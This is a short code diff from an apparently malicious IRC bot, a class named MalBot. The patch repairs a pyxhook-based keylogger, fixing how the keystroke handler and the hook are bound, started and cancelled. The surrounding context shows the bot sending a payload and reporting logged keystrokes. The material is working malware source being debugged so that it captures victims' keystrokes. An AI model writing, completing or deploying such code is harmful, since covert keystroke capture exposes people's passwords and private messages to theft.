@@ -24,7 +24,7 @@ class MalBot(pydle.Client):
             print("Bytes sent: {}".format(bytes_sent), end='\r')
             bytes_sent += len(payload)
     
-    def log_keystroke(event):
+    def log_keystroke(self, event):
         if event.Ascii==13:
             keystroke='\n'
         elif event.Ascii==8:
@@ -38,14 +38,14 @@ class MalBot(pydle.Client):
 
     def start_keylogger(self):
         self.log_file = open(self.log_file_name, 'a')
-        keylog_hook = pyxhook.HookManager()
-        keylog_hook.KeyDown = log_keystroke
-        keylog_hook.HookKeyboard()
-        keylog_hook.start()
+        self.keylog_hook = pyxhook.HookManager()
+        self.keylog_hook.KeyDown = self.log_keystroke
+        self.keylog_hook.HookKeyboard()
+        self.keylog_hook.start()
 
     def stop_keylogger(self):
         self.log_file.close()
-        keylog_hook.cancel()
+        self.keylog_hook.cancel()
     
     def report_keylog(self):
         self.stop_keylogger()
